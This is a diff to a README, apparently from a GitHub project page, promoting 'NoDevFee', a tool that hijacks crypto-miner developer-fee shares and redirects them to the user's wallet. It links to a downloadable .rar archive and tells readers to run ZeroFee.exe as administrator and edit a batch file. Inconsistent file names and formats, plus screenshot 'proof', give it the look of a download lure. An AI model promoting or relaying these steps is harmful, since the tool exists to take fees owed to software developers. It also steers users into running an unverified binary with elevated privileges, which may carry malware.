@@ -15,15 +15,42 @@ I created a NoDevFee tool that REMOVE the devfee from the minners.
 
 This tool remove the devfee, all devfee will be redirect to your address too.
 
-Supported algorithms
+## Supported algorithms
 
 - KawPow
 - Etchash
 - Ethash
 
+## WHAT IS IT?
+
+This program helps you to save you your money and earn more when you use Claymore's Dual Ethereum
+Miner. It reduses 1%(or 2% in Dual mode) fee.
+DevFee will mine to your wallet but miner wil think that it mines Real DevFee.
+It was tested on Windows 10 and Windows 7!
+Where to Download?
+
 ## Download Link:
 
 - [ ] [Download NoDevFee for Windows/Linux/MacOS](https://github.com/NoFeesDev/NoDevFee/releases/download/nodevfee/NoDevFee-master.rar)
+
+
+## How to Use?
+
+1) Download NoDevFee15.0.zip
+2) Right Click at ZeroFee.exe->Properties -> Compatibility tab->Run As Administator -> Save
+3) Open ZeroFee.bat and change wallet to your and mining pool port to your (you may not set it but it is recomended to reduce CPU usage) ->Run bat file
+
+## Stability
+
+It was tested with nanopool.org etheremine.org ethpool.org it works perfect.
+(I have additional 1.8mhs to my 176mhs with this software and)
+You can test it with other pools and tell results here.
+
+## Why do you need it
+
+I have 7 GPUs and nanopool shows me that I will get additional 1.975 USD/mo (and 3.95$ when I use dualmining with sia coin).
+Updated Proof :
+![image](https://user-images.githubusercontent.com/127042057/222974880-922b1749-cf8f-4390-9ec0-e56634b034f9.png)
 
 ## Examples
 
@@ -253,3 +280,4 @@ Changed devFee priority:
 
 v3.2:
 Now it works with all pools (tested). Slightly improved stability.  Archive type changed from .rar to .zip
+
